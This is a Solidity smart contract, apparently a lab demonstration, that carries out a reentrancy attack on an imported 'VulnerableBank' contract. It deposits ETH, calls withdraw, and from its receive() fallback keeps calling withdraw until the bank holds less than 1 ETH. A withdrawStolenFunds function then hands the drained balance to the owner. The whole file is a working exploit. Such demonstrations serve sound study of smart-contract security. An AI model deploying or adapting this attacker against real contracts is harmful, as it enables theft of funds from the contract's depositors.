// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract ReentrancyAttacker {

    VulnerableBank public vulnerableBank;
    address public owner;
    uint256 public attackCount;

    event AttackStarted(uint256 depositAmount);
    event ReentrancyExecuted(uint256 count, uint256 balance);
    event AttackCompleted(uint256 stolenAmount);

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        emit AttackStarted(msg.value);

        // Step 1: Deposit ETH into the vulnerable bank
        vulnerableBank.deposit{value: msg.value}();

        // Step 2: Start the reentrancy attack by calling withdraw
        attackCount = 0;
        vulnerableBank.withdraw();

        emit AttackCompleted(address(this).balance);
    }

    receive() external payable {
        attackCount++;
        emit ReentrancyExecuted(attackCount, address(vulnerableBank).balance);

        // Continue the attack if the vulnerable bank still has ETH
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
